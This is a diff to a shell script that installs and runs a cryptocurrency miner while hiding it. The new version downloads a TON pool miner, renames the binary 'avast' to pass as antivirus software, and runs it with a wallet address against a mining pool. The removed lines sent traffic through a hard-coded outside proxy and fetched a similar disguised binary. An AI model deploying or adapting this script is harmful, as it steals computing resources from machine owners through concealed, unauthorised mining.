@@ -4,14 +4,12 @@ apt install proxychains
 
 apt install screen -y
 
-sed -i 's/socks4/socks5/' /etc/proxychains.conf
+wget -q https://github.com/TON-Pool/miner/releases/download/0.3.4/ton-pool.com-miner-0.3.4-linux.tar.gz
 
-sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
+tar -xvf  ton-pool.com-miner-0.3.4-linux.tar.gz
 
-sed -i 's/9050/10663/' /etc/proxychains.conf
-
-wget https://raw.githubusercontent.com/renilo/bh/main/avast
+mv miner-linux avast
 
 chmod +x avast
 
-./avast run https://server1.whalestonpool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
+./avast run https://next.ton-pool.com EQCq8h0FQ_IzVSueBKoYahTBe5EXnomyu6WVTPp29L8YYG2Z
